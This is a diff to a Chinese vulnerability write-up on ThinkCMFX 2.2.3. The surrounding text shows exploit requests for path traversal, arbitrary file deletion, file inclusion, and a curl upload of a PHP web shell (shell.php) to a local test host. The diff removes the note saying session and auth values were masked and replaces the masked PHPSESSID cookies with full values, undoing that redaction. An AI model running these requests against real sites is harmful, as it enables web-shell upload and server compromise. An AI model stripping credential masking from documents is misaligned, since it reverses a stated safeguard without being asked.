@@ -20,7 +20,6 @@ schema_version: "1"
 
 ## 核对与使用边界
 
-- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。
 
 本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
 
@@ -47,7 +46,7 @@ schema_version: "1"
 POST /ThinkCMFX/index.php?g=portal&m=article&a=edit_post HTTP/1.1
 Host: localhost
 Connection: close
-Cookie: PHPSESSID=kcg********************j95
+Cookie: PHPSESSID=kcg5v82ms3v13o8pgrhh9saj95
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 79
 
@@ -86,7 +85,7 @@ http://website/ThinkCMFX/index.php?g=Api&m=Plugin&a=fetch&templateFile=/../../..
 ```
 POST /ThinkCMFX/index.php?g=User&m=Profile&a=do_avatar& HTTP/1.1
 Host: localhost
-Cookie: PHPSESSID=bgg********************mq0;
+Cookie: PHPSESSID=bggit7phrb1dl99pcb2lagbmq0;
 Connection: close
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 27
@@ -96,7 +95,7 @@ imgurl=..\..\..\test.txt
 
 - 任意文件上传  
 > 在 ThinkCMFX2.2.3 最终版中，存在一处任意文件上传（需要普通用户权限，默认可注册）  
-` curl -F "file=@/tmp/shell.php" -X "POST" -b 'PHPSESSID=qek********************kd0;' 'http://127.0.0.1/ThinkCMFX/index.php?g=Asset&m=Ueditor&a=upload&action=uploadfile'
+` curl -F "file=@/tmp/shell.php" -X "POST" -b 'PHPSESSID=qekmttucmue6vv41kpdjghnkd0;' 'http://127.0.0.1/ThinkCMFX/index.php?g=Asset&m=Ueditor&a=upload&action=uploadfile'
 `
 
 - 任意文件包含（读取数据库配置等等）  
